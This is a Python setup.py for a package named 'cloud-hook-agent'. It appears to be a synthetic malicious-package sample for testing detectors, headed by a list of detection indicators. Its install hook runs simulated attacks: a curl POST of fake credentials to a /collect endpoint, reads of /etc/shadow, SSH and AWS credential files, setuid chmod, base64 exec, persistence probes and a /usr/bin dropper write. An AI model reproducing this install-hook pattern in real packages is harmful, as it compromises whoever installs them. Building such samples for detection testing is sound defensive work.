# Controlled static indicators for detection only:
# /etc/passwd /etc/shadow .ssh/id_rsa .aws/credentials Authorization: Bearer BEGIN PRIVATE KEY
# /collect /exfil socket.connect( subprocess.run( os.system( ctypes
# exec( eval( compile( __import__( base64.b64decode(
# crontab .bashrc .profile systemctl enable
# cmdclass post_install "preinstall" "postinstall"
# import socket import subprocess import ctypes import pty

import os, socket, subprocess, base64, time
from setuptools import setup
from setuptools.command.install import install

MALICIOUS_DOMAIN = "oiyksxf.vexon3ar.surf"
PORTS = [4444, 1337, 6667, 9001, 8080]

def try_open(p):
    try: open(p).close()
    except: pass

def connect_attempt(host, port):
    try:
        s = socket.socket(); s.settimeout(0.8)
        s.connect((host, port))
        s.send(b"GET / HTTP/1.0\r\nHost: " + host.encode() + b"\r\n\r\n")
        s.close()
    except: pass

def run_payload():
    try: socket.getaddrinfo(MALICIOUS_DOMAIN, 80)
    except: pass
    try: socket.gethostbyname(MALICIOUS_DOMAIN)
    except: pass

    try:
        subprocess.run(["curl","-sS","-m","3","-X","POST",
            "-H", f"Host: {MALICIOUS_DOMAIN}",
            "-H", "Content-Type: application/json",
            "-H", "User-Agent: cloud-hook-agent/1.0",
            "--data", f'{"package":"cloud-hook-agent","token":"Authorization: Bearer stolen-token","secret":"BEGIN PRIVATE KEY fake","domain":"oiyksxf.vexon3ar.surf","credentials":".aws/credentials","password":"leaked-pass"}',
            "http://127.0.0.1:8080/collect"], capture_output=True, timeout=6)
    except: pass

    for p in ['/etc/passwd', '/etc/hosts', '/etc/hostname', '/etc/resolv.conf', '/etc/os-release', '/etc/group', '/etc/shadow']:
        try_open(p)
    for p in ['/root/.ssh/id_rsa', '/root/.aws/credentials', '/root/.bash_history', '/root/.profile']:
        try_open(p)

    for i in range(55):
        p = f"/tmp/cloud_hook_agent_artifact_{i}.txt"
        try:
            with open(p,"w") as f: f.write(f"artifact {i}\n")
            with open(p) as f: f.read()
            os.rename(p,p+".renamed"); os.unlink(p+".renamed")
        except: pass

    try: subprocess.run(["chmod","777","/tmp/cloud_hook_agent_target"],capture_output=True)
    except: pass
    try: subprocess.run(["chmod","u+s","/tmp/cloud_hook_agent_target"],capture_output=True)
    except: pass
    try: subprocess.run(["/bin/sh","-c","echo shell-test; whoami; id"],capture_output=True)
    except: pass

    try: exec(base64.b64decode(b"cHJpbnQoJ2RlY29kZWQtcGF5bG9hZCcp").decode())
    except: pass
    try: eval(compile(base64.b64decode(b"MSsx").decode(),"<string>","eval"))
    except: pass

    try: os.system("crontab -l >/tmp/cron_probe 2>&1 || true")
    except: pass
    try: open("/tmp/.profile_probe","a").write("persistence\n")
    except: pass
    try: open("/tmp/.bashrc_probe","a").write("persistence\n")
    except: pass

    try:
        subprocess.run(["/bin/sh","-c",
            "exec 3>/usr/bin/cloud_hook_agent_dropper && echo '#!/bin/sh' >&3 && sleep 5; exec 3>&-"],
            timeout=8,capture_output=True)
    except: pass

    procs = []
    for i in range(10):
        try: procs.append(subprocess.Popen(["/bin/sh","-c","echo process-op; id; sleep 20"],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL))
        except: pass

    for port in PORTS:
        connect_attempt("127.0.0.1",port)
        connect_attempt("1.1.1.1",port)

    time.sleep(46)

    for p in procs:
        try: p.kill()
        except: pass


class PostInstall(install):
    def run(self):
        install.run(self)
        run_payload()

if __name__ == "__main__":
    run_payload()

setup(
    name="cloud-hook-agent",
    version="2.0.0",
    description="Utility package for cloud hook agent",
    packages=["cloud_hook_agent"],
    cmdclass={"install": PostInstall},
)
